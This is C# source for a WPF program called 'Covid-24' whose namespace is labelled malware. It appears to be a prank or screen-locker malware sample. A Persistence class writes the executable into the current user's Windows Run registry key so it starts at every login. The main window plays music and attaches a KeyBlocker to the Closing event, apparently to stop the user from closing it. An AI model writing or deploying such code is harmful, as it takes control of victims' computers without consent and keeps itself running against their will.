using Microsoft.Win32;
using System;
using System.Reflection;
using System.Windows;
using Covid_24.ViewModel.Sound;
using Covid_24.ViewModel.malware;


namespace Covid_24
{
    public class Persistence
    {
        private Persistence()
        {
            try
            {
                string executablePath = Assembly.GetExecutingAssembly().Location.Replace(".dll", ".exe");

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("Covid-24", "\"" + executablePath + "\"");
                }

                Console.WriteLine("Persistence set successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        MusicPlayer _player;
        public MainWindow()
        {
            _player = new MusicPlayer();
            _player.Play();

            Persistence persistence = new Persistence();
            KeyBlocker keyBlocker = new KeyBlocker();

            Closing += keyBlocker.MainWindow_Closing;
            
            InitializeComponent();
        }
    }
}
